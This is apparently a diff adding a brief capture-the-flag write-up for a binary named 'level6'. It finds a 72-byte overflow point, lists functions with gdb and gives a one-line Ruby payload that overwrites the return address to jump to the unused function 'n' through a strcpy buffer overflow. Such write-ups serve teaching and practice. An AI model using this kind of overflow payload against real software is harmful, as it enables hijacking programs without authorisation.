@@ -1,0 +1,16 @@
+When trying to execute the binary we can see that it segfault
+if the string passed is 72+bytes long.
+    $ ./level6 $(ruby -e 'print "A" * 71')
+    $ Nope
+    $ ./level6 $(ruby -e 'print "A" * 72')
+    $ Segmentation fault (core dumped)
+
+With '(gdb) info functions' we can see2 functions, 'm' and 'n'.
+    0x08048454  n
+    0x08048468  m
+    0x0804847c  main
+
+Function 'm' is called in 'main' but function 'n' is never used so we will try to call it.
+We will use the strcpy vulnerability to buffer overflow.
+
+$ ./level6 $(ruby -e 'print "A" * 72 + "\x54\x84\x04\x08"')
